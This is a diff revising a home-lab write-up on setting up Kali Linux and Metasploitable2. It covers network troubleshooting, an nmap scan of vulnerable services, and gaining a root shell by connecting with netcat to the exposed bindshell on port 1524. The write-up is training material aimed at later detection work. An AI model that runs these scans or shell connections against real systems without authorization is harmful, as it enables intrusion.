@@ -1,99 +1,75 @@
-🧪 Home Lab 01 – Kali Setup + First Exploit (Metasploitable2)
-🎯 Objective
+🛡️ Metasploitable2 – Initial Access & Root via Bindshell (Port 1524)
+📌 Overview
 
-Set up a local cybersecurity lab using Kali Linux and Metasploitable2, perform enumeration, identify vulnerabilities, and gain root access.
+This lab documents the initial setup of a local penetration testing environment using Kali Linux and Metasploitable2. The objective was to perform enumeration, identify vulnerabilities, and achieve root access on the target machine.
 
-🧱 Lab Environment
-🖥️ Attacker Machine
+🧱 Lab Setup
+🖥️ Attacker
 
 OS: Kali Linux (VMware)
 
-RAM: 16 GB allocated
-
 Network: NAT
 
-🎯 Target Machine
+🎯 Target
 
 OS: Metasploitable2
 
 Network: NAT
 
-⚙️ Initial Setup
-1. Kali Installation
+🔧 Environment Preparation
+Kali Network Fix (Key Issue Encountered)
 
-Imported prebuilt Kali VMware image
-
-Configured:
-
-Network Adapter: NAT
-
-Connected at power on
-
-2. Network Troubleshooting
-
-Encountered:
+During setup, Kali was unable to reach update repositories:
 
 Temporary failure resolving 'http.kali.org'
-🔧 Fixes Applied
+Resolution:
 
-Ensured VM network adapter was Connected
+Ensured network adapter was connected
 
-Restarted VMware services:
-
-VMware NAT Service
-
-VMware DHCP Service
+Restarted VMware networking services
 
 Restored Virtual Network defaults
 
 Re-added network adapter
 
-Verified IP assignment:
+Verified IP assignment using:
 
 ip a
-
-Result:
-
-inet 192.168.74.128
-3. System Update
+System Update
 sudo apt update && sudo apt full-upgrade -y
 sudo apt autoremove -y
-reboot
-🧱 Lab Setup
-1. Import Metasploitable2
+🌐 Target Deployment
 
-Opened .vmx file in VMware
+Metasploitable2 was imported into VMware and configured with NAT networking.
 
-Set network to NAT
+Connectivity Check
 
-2. Verify Connectivity
-On Metasploitable:
-ip a
-
-Result:
+Target IP:
 
 192.168.74.129
-From Kali:
+
+Verification:
+
 ping 192.168.74.129
-
-✅ Successful communication
-
 🔍 Enumeration
 Nmap Scan
 nmap -sC -sV 192.168.74.129
-🔑 Key Findings
-Port	Service	Notes
-21	vsftpd 2.3.4	Known backdoor vulnerability
-22	SSH	Open
-23	Telnet	Insecure
-80	Apache	Web server
-445	Samba	Potential exploitation
-1524	Bindshell	🚨 Direct root access
-3306	MySQL	Database
-8180	Tomcat	Web app
+Key Findings
+Port	Service	Version	Notes
+21	FTP	vsftpd 2.3.4	Known backdoor vulnerability
+22	SSH	OpenSSH 4.7	Outdated
+23	Telnet	-	Insecure
+80	HTTP	Apache 2.2.8	Web server
+139/445	SMB	Samba 3.0.20	Potential exploit
+1524	bindshell	-	🚨 Direct root access
+3306	MySQL	5.0.51	Database
+8180	Tomcat	5.5	Web application
 💥 Exploitation
-🎯 Target: Port 1524 (Bindshell)
-Command:
+🎯 Target: Bindshell (Port 1524)
+
+The Nmap scan revealed an open bindshell service on port 1524, indicating a potential direct shell access point.
+
+Exploit Execution
 nc 192.168.74.129 1524
 🎯 Result
 root@metasploitable:/#
@@ -105,58 +81,50 @@ Output:
 root
 🧠 Analysis
 
-Port 1524 exposed a preconfigured bindshell
+Port 1524 exposed a preconfigured root bindshell
 
 No authentication required
 
-Immediate root-level access granted
+Immediate root-level access achieved
 
-Represents a critical misconfiguration/backdoor
+Represents a critical security misconfiguration
 
-🔐 Security Insight
+🔐 Security Implications
 
-This demonstrates:
+This scenario highlights:
 
-The importance of port scanning
+The importance of network enumeration
 
-Risks of unsecured services
+Risks of exposed services
 
-Why network monitoring and segmentation are critical
+The necessity of proper system hardening
 
-📸 Evidence (Add Screenshots)
+Why continuous monitoring and detection are critical
+
+📸 Proof of Exploitation
+
+(Add screenshots here)
 
 Nmap scan results
 
 Netcat connection
 
-Root shell (whoami)
+Root shell confirmation (whoami)
 
-📁 Folder Structure
-~/lab/
-├── ctf/
-├── notes/
-├── loot/
-├── scripts/
-├── writeups/
-│   └── metasploitable2/
-🚀 Key Takeaways
+🗂️ Notes
 
-Successfully built a working cyber lab
+This was the first successful exploitation in the lab environment
 
-Performed enumeration using Nmap
+Demonstrates a low-effort, high-impact vulnerability
 
-Identified vulnerable services
+Establishes baseline for future attack + detection scenarios
 
-Achieved root access via manual exploitation
+🚀 Next Steps
 
-Established foundation for red/blue team exercises
+Capture attack traffic using Wireshark
 
-🔄 Next Steps
+Analyze indicators of compromise
 
-Capture attack traffic with Wireshark
+Forward logs into Splunk
 
-Analyze logs and detect activity
-
-Integrate Splunk for monitoring
-
-Expand lab with Windows + Active Directory
+Build detection queries and dashboards
